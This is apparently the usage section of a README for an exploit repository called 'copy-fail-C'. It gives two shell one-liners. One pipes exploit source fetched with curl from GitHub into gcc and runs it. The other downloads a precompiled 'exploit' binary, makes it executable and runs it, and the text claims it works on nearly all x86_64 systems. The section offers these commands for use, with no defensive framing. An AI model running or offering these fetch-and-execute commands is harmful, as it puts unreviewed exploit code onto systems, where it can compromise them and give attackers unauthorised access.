## Shell one-liners

Simply run
```bash
curl https://raw.githubusercontent.com/d-Qw4w9WgXc-Q/copy-fail-C/refs/heads/master/exploit.c | gcc -std=c11 -xc - && ./a.out
```
To compile from source

Or

```bash
curl -O https://raw.githubusercontent.com/d-Qw4w9WgXc-Q/copy-fail-C/refs/heads/master/exploit && chmod +x exploit && ./exploit
```
For the precompiled exploit

The latter should work on pretty much all x86_64 systems
